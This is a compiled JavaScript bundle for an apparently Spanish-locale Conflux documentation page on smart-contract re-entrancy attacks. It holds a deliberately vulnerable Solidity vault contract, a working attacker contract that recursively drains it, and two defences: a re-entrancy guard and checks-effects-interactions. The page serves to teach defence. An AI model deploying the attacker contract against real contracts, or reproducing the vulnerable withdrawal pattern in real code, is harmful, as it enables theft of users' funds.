"use strict";(self.webpackChunkconflux_docs=self.webpackChunkconflux_docs||[]).push([[788],{20614:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>o,contentTitle:()=>c,default:()=>u,frontMatter:()=>s,metadata:()=>i,toc:()=>l});var a=t(85893),r=t(11151);const s={displayed_sidebar:"generalSidebar"},c="Re-entrancy Attacks",i={id:"general/build/smart-contracts/contract-security/reentrancy-attack",title:"Re-entrancy Attacks",description:"Re-entrancy attacks are among the most common types of assaults on smart contracts, where attackers exploit contract vulnerabilities to recursively call the contract, enabling them to transfer assets out of the contract or mint a large number of tokens.",source:"@site/docs/general/build/smart-contracts/contract-security/reentrancy-attack.md",sourceDirName:"general/build/smart-contracts/contract-security",slug:"/general/build/smart-contracts/contract-security/reentrancy-attack",permalink:"/es/docs/general/build/smart-contracts/contract-security/reentrancy-attack",draft:!1,unlisted:!1,editUrl:"https://crowdin.com/project/conflux/es",tags:[],version:"current",frontMatter:{displayed_sidebar:"generalSidebar"},sidebar:"generalSidebar",previous:{title:"Smart Contract Security",permalink:"/es/docs/general/build/smart-contracts/contract-security/"},next:{title:"Selector Collision Attack",permalink:"/es/docs/general/build/smart-contracts/contract-security/selector-collisiion"}},o={},l=[{value:"Defense Mechanisms",id:"defense-mechanisms",level:2},{value:"Re-entrancy Guard",id:"re-entrancy-guard",level:3},{value:"Checks-Effects-Interactions Pattern",id:"checks-effects-interactions-pattern",level:3}];function d(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",p:"p",pre:"pre",...(0,r.a)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.h1,{id:"re-entrancy-attacks",children:"Re-entrancy Attacks"}),"\n",(0,a.jsx)(n.p,{children:"Re-entrancy attacks are among the most common types of assaults on smart contracts, where attackers exploit contract vulnerabilities to recursively call the contract, enabling them to transfer assets out of the contract or mint a large number of tokens."}),"\n",(0,a.jsx)(n.p,{children:"In 2016, the DAO contract fell victim to a reentrancy attack, leading to the theft of 3,600,000 ETH from the contract. This incident resulted in the Ethereum network splitting into two chains: ETH and ETC (Ethereum Classic)."}),"\n",(0,a.jsxs)(n.p,{children:["In 2022, the algorithmic stablecoin project Fei was hit by a reentrancy attack, resulting in a theft of $80,000,000. More information can be found ",(0,a.jsx)(n.a,{href:"https://rekt.news/fei-rari-rekt/",children:"here"}),"."]}),"\n",(0,a.jsx)(n.p,{children:"Reentrancy attack may occur when a contract makes external calls before ensuring that its state is correctly updated. Attackers can exploit this by making the vulnerable contract invoke an attacker-controlled contract, which then re-invokes the original contract repeatedly. This repeated invocation can manipulate the contract's state before it's correctly updated, leading to potential loss of funds."}),"\n",(0,a.jsxs)(n.p,{children:["Consider a simplified ",(0,a.jsx)(n.code,{children:"FinancialVault"})," contract that allows depositing and withdrawing ETH, analogous to a bank account:"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-solidity",children:'contract FinancialVault {\n    mapping(address => uint256) public balances;\n\n    function depositFunds() external payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdrawFunds() external {\n        uint256 fundsToWithdraw = balances[msg.sender];\n        require(fundsToWithdraw > 0, "No funds available");\n        \n        (bool sent, ) = msg.sender.call{value: fundsToWithdraw}("");\n        require(sent, "Failed to send funds");\n        \n        balances[msg.sender] = 0;\n    }\n\n    function getVaultBalance() external view returns (uint256) {\n        return address(this).balance;\n    }\n}\n'})}),"\n",(0,a.jsxs)(n.p,{children:["In this contract, the ",(0,a.jsx)(n.code,{children:"withdrawFunds"})," method is vulnerable to re-entrancy attacks. An attacker can exploit this by using a contract designed to re-enter the ",(0,a.jsx)(n.code,{children:"FinancialVault"})," contract during a withdrawal:"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-solidity",children:'contract AttackVault {\n    FinancialVault public vault;\n\n    constructor(FinancialVault _vault) {\n        vault = _vault;\n    }\n\n    receive() external payable {\n        if (address(vault).balance >= 1 ether) {\n            vault.withdrawFunds();\n        }\n    }\n\n    function initiateAttack() external payable {\n        require(msg.value == 1 ether, "1 Ether required for the attack");\n        vault.depositFunds{value: 1 ether}();\n        vault.withdrawFunds();\n    }\n\n    function getContractBalance() external view returns (uint256) {\n        return address(this).balance;\n    }\n}\n'})}),"\n",(0,a.jsx)(n.h2,{id:"defense-mechanisms",children:"Defense Mechanisms"}),"\n",(0,a.jsx)(n.h3,{id:"re-entrancy-guard",children:"Re-entrancy Guard"}),"\n",(0,a.jsxs)(n.p,{children:["A re-entrancy guard is a simple yet effective strategy to prevent such attacks. It involves setting a flag when a function starts executing and resetting it upon completion. This ensures the function cannot be re-entered while it's still running. The OpenZeppelin library provides an implementation of this pattern. Here is an example of applying a re-entrancy guard to the ",(0,a.jsx)(n.code,{children:"withdrawFunds"})," function:"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-solidity",children:'uint256 private _guardCounter = 1;\n\nmodifier nonReentrant() {\n    require(_guardCounter == 1, "Reentrant call");\n    _guardCounter++;\n    _;\n    _guardCounter--;\n}\n\nfunction withdrawFunds() external nonReentrant {\n    uint256 fundsToWithdraw = balances[msg.sender];\n    require(fundsToWithdraw > 0, "No funds available");\n    \n    (bool sent, ) = msg.sender.call{value: fundsToWithdraw}("");\n    require(sent, "Failed to send funds");\n    \n    balances[msg.sender] = 0;\n}\n'})}),"\n",(0,a.jsx)(n.h3,{id:"checks-effects-interactions-pattern",children:"Checks-Effects-Interactions Pattern"}),"\n",(0,a.jsx)(n.p,{children:"This pattern dictates that functions should first perform all necessary checks, update the contract's state, and then make any external calls. Adhering to this pattern ensures that all state changes are finalized before interacting with external contracts."}),"\n",(0,a.jsxs)(n.p,{children:["Learn more: ",(0,a.jsx)(n.a,{href:"https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html",children:"Checks Effects Interactions"})]}),"\n",(0,a.jsxs)(n.p,{children:["Implementing this in the ",(0,a.jsx)(n.code,{children:"withdrawFunds"})," function would involve updating the user's balance before attempting to send them their funds:"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-solidity",children:'function withdrawFunds() external {\n    uint256 fundsToWithdraw = balances[msg.sender];\n    require(fundsToWithdraw > 0, "No funds available");\n    \n    balances[msg.sender] = 0;\n    \n    (bool sent, ) = msg.sender.call{value: fundsToWithdraw}("");\n    require(sent, "Failed to send funds");\n}\n'})}),"\n",(0,a.jsx)(n.p,{children:"By following these practices, smart contract developers can significantly reduce the risk of re-entrancy attacks and ensure the security of their contracts."})]})}function u(e={}){const{wrapper:n}={...(0,r.a)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(d,{...e})}):d(e)}},11151:(e,n,t)=>{t.d(n,{Z:()=>i,a:()=>c});var a=t(67294);const r={},s=a.createContext(r);function c(e){const n=a.useContext(s);return a.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:c(e.components),a.createElement(s.Provider,{value:n},e.children)}}}]);